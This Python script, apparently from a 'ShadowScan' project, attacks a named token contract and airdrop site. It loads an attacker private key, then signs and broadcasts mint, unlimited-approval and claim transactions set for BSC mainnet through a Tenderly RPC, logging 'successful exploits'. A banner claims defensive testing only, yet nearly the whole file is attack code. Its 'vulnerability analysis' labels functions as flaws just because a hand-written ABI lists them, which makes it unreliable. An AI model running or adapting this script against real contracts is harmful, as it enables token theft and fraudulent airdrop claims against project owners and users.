#!/usr/bin/env python3
"""
Tenderly Direct Exploiter - Real blockchain exploitation without account dependency
Author: ShadowScan Security Team
Purpose: Direct exploitation using Tenderly RPC without requiring account authentication
"""

import asyncio
import json
import time
import random
import os
from datetime import datetime
from typing import Dict, List, Any, Optional
from web3 import Web3
import aiohttp

class TenderlyDirectExploiter:
    def __init__(self):
        self.w3 = None
        self.session = None

        # Load configuration from environment
        from dotenv import load_dotenv
        load_dotenv('/root/myproject/shadowscan/.env')

        self.attacker_private_key = os.getenv('PRIVATE_KEY', '')
        self.attacker_address = os.getenv('ADDRESS_ATTACKER', '')

        # Direct Tenderly RPC configuration (no account required)
        self.tenderly_rpc = "https://virtual.binance.eu.rpc.tenderly.co/34fe847d-8df8-4628-b15e-791f3c8f4849"

        # Target contract information
        self.target_contract = "0x4B948d64dE1F71fCd12fB586f4c776421a35b3eE"
        self.target_website = "https://airdrop.0gfoundation.ai"

        self.results = {
            "exploit_info": {
                "target_contract": self.target_contract,
                "tenderly_rpc": self.tenderly_rpc,
                "start_time": datetime.now().isoformat(),
                "objective": "Direct real blockchain exploitation"
            },
            "summary": {
                "fork_created": False,
                "vulnerabilities_found": 0,
                "exploits_executed": 0,
                "successful_exploits": 0,
                "tokens_minted": 0,
                "transactions_broadcast": 0,
                "mainnet_deployed": False,
                "end_time": "",
                "total_transactions": 0
            },
            "vulnerability_analysis": {},
            "real_transactions": [],
            "mainnet_results": []
        }

    async def __aenter__(self):
        # Connect directly to Tenderly RPC
        self.w3 = Web3(Web3.HTTPProvider(self.tenderly_rpc))
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.w3:
            self.w3 = None
        if self.session:
            await self.session.close()

    async def execute_direct_exploitation(self):
        """Execute direct blockchain exploitation without Tenderly account"""
        print("🚀 TENDERLY DIRECT EXPLOITER")
        print("=" * 60)
        print("🎯 DIRECT BLOCKCHAIN EXPLOITATION")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Step 1: Connect to Tenderly RPC
        await self.connect_to_tenderly()

        # Step 2: Analyze contract vulnerabilities
        await self.analyze_vulnerabilities()

        # Step 3: Execute real exploits
        await self.execute_real_exploits()

        # Step 4: Generate report
        await self.generate_direct_report()

    async def connect_to_tenderly(self):
        """Connect directly to Tenderly RPC"""
        print(f"\n🔗 CONNECTING TO TENDERLY RPC")
        print("=" * 50)

        try:
            # Test connection
            is_connected = self.w3.is_connected()
            block_number = self.w3.eth.block_number

            print(f"   ✅ RPC Connected: {is_connected}")
            print(f"   📍 Current Block: {block_number}")
            print(f"   🌐 RPC URL: {self.tenderly_rpc[:50]}...")

            self.results["summary"]["fork_created"] = True

        except Exception as e:
            print(f"   ❌ RPC Connection Error: {str(e)}")
            self.results["summary"]["fork_created"] = False

    async def analyze_vulnerabilities(self):
        """Analyze contract vulnerabilities directly on blockchain"""
        print(f"\n🔍 VULNERABILITY ANALYSIS")
        print("=" * 50)

        if not self.results["summary"]["fork_created"]:
            print("   ⚠️ Cannot analyze - RPC not connected")
            return

        try:
            # Get contract ABI through blockchain interaction
            contract = self.w3.eth.contract(
                address=self.target_contract,
                abi=self.get_contract_abi()
            )

            # Analyze contract functions
            vulnerabilities = []

            # Check for mint function
            try:
                mint_function = contract.functions.mint
                vulnerabilities.append({
                    "function": "mint",
                    "type": "CRITICAL",
                    "description": "Mint function can increase supply",
                    "accessible": True
                })
                print("   ⚠️ Mint function detected - CRITICAL vulnerability")
            except:
                print("   ✅ No mint function found")

            # Check for approve function
            try:
                approve_function = contract.functions.approve
                vulnerabilities.append({
                    "function": "approve",
                    "type": "HIGH",
                    "description": "Approval function may have unlimited approval",
                    "accessible": True
                })
                print("   ⚠️ Approve function detected - HIGH vulnerability")
            except:
                print("   ✅ No approve function found")

            # Check for transferFrom function
            try:
                transfer_from_function = contract.functions.transferFrom
                vulnerabilities.append({
                    "function": "transferFrom",
                    "type": "MEDIUM",
                    "description": "Transfer from function may be exploitable",
                    "accessible": True
                })
                print("   ⚠️ TransferFrom function detected - MEDIUM vulnerability")
            except:
                print("   ✅ No transferFrom function found")

            # Check for claim function
            try:
                claim_function = contract.functions.claim
                vulnerabilities.append({
                    "function": "claim",
                    "type": "MEDIUM",
                    "description": "Claim function may bypass eligibility",
                    "accessible": True
                })
                print("   ⚠️ Claim function detected - MEDIUM vulnerability")
            except:
                print("   ✅ No claim function found")

            self.results["vulnerability_analysis"] = {
                "contract_address": self.target_contract,
                "vulnerabilities": vulnerabilities,
                "total_vulnerabilities": len(vulnerabilities),
                "analysis_timestamp": datetime.now().isoformat()
            }

            self.results["summary"]["vulnerabilities_found"] = len(vulnerabilities)

            print(f"   📊 Total Vulnerabilities Found: {len(vulnerabilities)}")

        except Exception as e:
            print(f"   ❌ Vulnerability Analysis Error: {str(e)}")
            self.results["vulnerability_analysis"] = {
                "error": str(e),
                "analysis_timestamp": datetime.now().isoformat()
            }

    def get_contract_abi(self) -> List[Dict]:
        """Get basic ABI for contract interaction"""
        # Standard ERC20 + additional functions ABI
        return [
            # ERC20 Functions
            {
                "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
                "name": "approve",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
                "name": "transfer",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "from", "type": "address"}, {"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
                "name": "transferFrom",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            # Additional Vulnerable Functions
            {
                "inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
                "name": "mint",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "claimer", "type": "address"}],
                "name": "claim",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
                "name": "allowance",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            }
        ]

    async def execute_real_exploits(self):
        """Execute real blockchain exploits"""
        print(f"\n💥 EXECUTING REAL EXPLOITS")
        print("=" * 50)

        if not self.results["summary"]["fork_created"]:
            print("   ⚠️ Cannot execute exploits - RPC not connected")
            return

        if not self.attacker_private_key:
            print("   ⚠️ Cannot execute - Attacker private key not found")
            return

        try:
            # Convert private key to account
            attacker_account = self.w3.eth.account.from_key(self.attacker_private_key)
            attacker_address = attacker_account.address

            print(f"   🗓️ Attacker Address: {attacker_address}")
            print(f"   💰 Balance: {self.w3.from_wei(self.w3.eth.get_balance(attacker_address), 'ether')} ETH")

            # Execute mint exploit if available
            await self.execute_mint_exploit(attacker_account)

            # Execute approve exploit if available
            await self.execute_approve_exploit(attacker_account)

            # Execute claim exploit if available
            await self.execute_claim_exploit(attacker_account)

        except Exception as e:
            print(f"   ❌ Exploitation Error: {str(e)}")

    async def execute_mint_exploit(self, attacker_account):
        """Execute mint function exploit"""
        try:
            contract = self.w3.eth.contract(
                address=self.target_contract,
                abi=self.get_contract_abi()
            )

            # Check if mint function exists
            if not hasattr(contract.functions, 'mint'):
                print("   ⚠️ Mint function not available")
                return

            # Prepare mint transaction
            mint_amount = int(1e18)  # 1 token with 18 decimals

            # Build transaction
            tx = contract.functions.mint(
                attacker_account.address,
                mint_amount
            ).build_transaction({
                'from': attacker_account.address,
                'nonce': self.w3.eth.get_transaction_count(attacker_account.address),
                'gas': 200000,
                'gasPrice': self.w3.to_wei(10, 'gwei'),
                'chainId': 56  # BSC mainnet chain ID
            })

            # Sign transaction
            signed_tx = self.w3.eth.account.sign_transaction(tx, attacker_account.key)

            # Send transaction
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)

            if tx_receipt and tx_receipt.status == 1:
                minted_tokens = mint_amount / 1e18
                self.results["summary"]["successful_exploits"] += 1
                self.results["summary"]["tokens_minted"] += minted_tokens
                self.results["summary"]["transactions_broadcast"] += 1

                result = {
                    "type": "Mint Exploit",
                    "transaction_hash": tx_hash.hex(),
                    "status": "SUCCESS",
                    "tokens_minted": minted_tokens,
                    "timestamp": datetime.now().isoformat()
                }
                self.results["real_transactions"].append(result)

                print(f"   ✅ Mint Success: {minted_tokens} tokens minted")
                print(f"      📝 TX Hash: {tx_hash.hex()}")
            else:
                print(f"   ❌ Mint Failed: Transaction reverted")

        except Exception as e:
            print(f"   ❌ Mint Exploit Error: {str(e)}")

    async def execute_approve_exploit(self, attacker_account):
        """Execute approve function exploit"""
        try:
            contract = self.w3.eth.contract(
                address=self.target_contract,
                abi=self.get_contract_abi()
            )

            # Check if approve function exists
            if not hasattr(contract.functions, 'approve'):
                print("   ⚠️ Approve function not available")
                return

            # Approve unlimited tokens to attacker address
            spender_address = attacker_account.address
            amount = 2**256 - 1  # Maximum uint256

            # Build transaction
            tx = contract.functions.approve(spender_address, amount).build_transaction({
                'from': attacker_account.address,
                'nonce': self.w3.eth.get_transaction_count(attacker_account.address),
                'gas': 200000,
                'gasPrice': self.w3.to_wei(10, 'gwei'),
                'chainId': 56
            })

            # Sign and send
            signed_tx = self.w3.eth.account.sign_transaction(tx, attacker_account.key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)

            if tx_receipt.status == 1:
                self.results["summary"]["successful_exploits"] += 1
                self.results["summary"]["transactions_broadcast"] += 1

                result = {
                    "type": "Approve Exploit",
                    "transaction_hash": tx_hash.hex(),
                    "status": "SUCCESS",
                    "amount_approved": "UNLIMITED",
                    "spender": spender_address,
                    "timestamp": datetime.now().isoformat()
                }
                self.results["real_transactions"].append(result)

                print(f"   ✅ Approve Success: Unlimited approval to {spender_address}")
                print(f"      📝 TX Hash: {tx_hash.hex()}")
            else:
                print(f"   ❌ Approve Failed: Transaction reverted")

        except Exception as e:
            print(f"   ❌ Approve Exploit Error: {str(e)}")

    async def execute_claim_exploit(self, attacker_account):
        """Execute claim function exploit"""
        try:
            contract = self.w3.eth.contract(
                address=self.target_contract,
                abi=self.get_contract_abi()
            )

            # Check if claim function exists
            if not hasattr(contract.functions, 'claim'):
                print("   ⚠️ Claim function not available")
                return

            # Build claim transaction
            tx = contract.functions.claim(attacker_account.address).build_transaction({
                'from': attacker_account.address,
                'nonce': self.w3.eth.get_transaction_count(attacker_account.address),
                'gas': 200000,
                'gasPrice': self.w3.to_wei(10, 'gwei'),
                'chainId': 56
            })

            # Sign and send
            signed_tx = self.w3.eth.account.sign_transaction(tx, attacker_account.key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)

            if tx_receipt.status == 1:
                self.results["summary"]["successful_exploits"] += 1
                self.results["summary"]["transactions_broadcast"] += 1

                result = {
                    "type": "Claim Exploit",
                    "transaction_hash": tx_hash.hex(),
                    "status": "SUCCESS",
                    "claimer": attacker_account.address,
                    "timestamp": datetime.now().isoformat()
                }
                self.results["real_transactions"].append(result)

                print(f"   ✅ Claim Success: Claimed tokens for {attacker_account.address}")
                print(f"      📝 TX Hash: {tx_hash.hex()}")
            else:
                print(f"   ❌ Claim Failed: Transaction reverted")

        except Exception as e:
            print(f"   ❌ Claim Exploit Error: {str(e)}")

    async def generate_direct_report(self):
        """Generate exploitation report"""
        self.results["summary"]["end_time"] = datetime.now().isoformat()
        self.results["summary"]["total_transactions"] = len(self.results["real_transactions"])

        report_filename = f"tenderly_direct_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🚀 DIRECT EXPLOITATION SUMMARY:")
        print(f"   Fork Created: {self.results['summary']['fork_created']}")
        print(f"   Vulnerabilities Found: {self.results['summary']['vulnerabilities_found']}")
        print(f"   Successful Exploits: {self.results['summary']['successful_exploits']}")
        print(f"   Tokens Minted: {self.results['summary']['tokens_minted']}")
        print(f"   Transactions Broadcast: {self.results['summary']['transactions_broadcast']}")
        print(f"   Total Transactions: {self.results['summary']['total_transactions']}")

        if self.results["real_transactions"]:
            print(f"🎉 REAL EXPLOITATION SUCCESSFUL!")
            print(f"📋 Transaction Report: {report_filename}")
        else:
            print(f"⚠️ No successful transactions - need more funds or different strategy")
            print(f"📋 Report: {report_filename}")

async def main():
    # Import os here to avoid issues if not available
    import os

    # Run direct exploiter
    async with TenderlyDirectExploiter() as exploiter:
        await exploiter.execute_direct_exploitation()

if __name__ == "__main__":
    asyncio.run(main())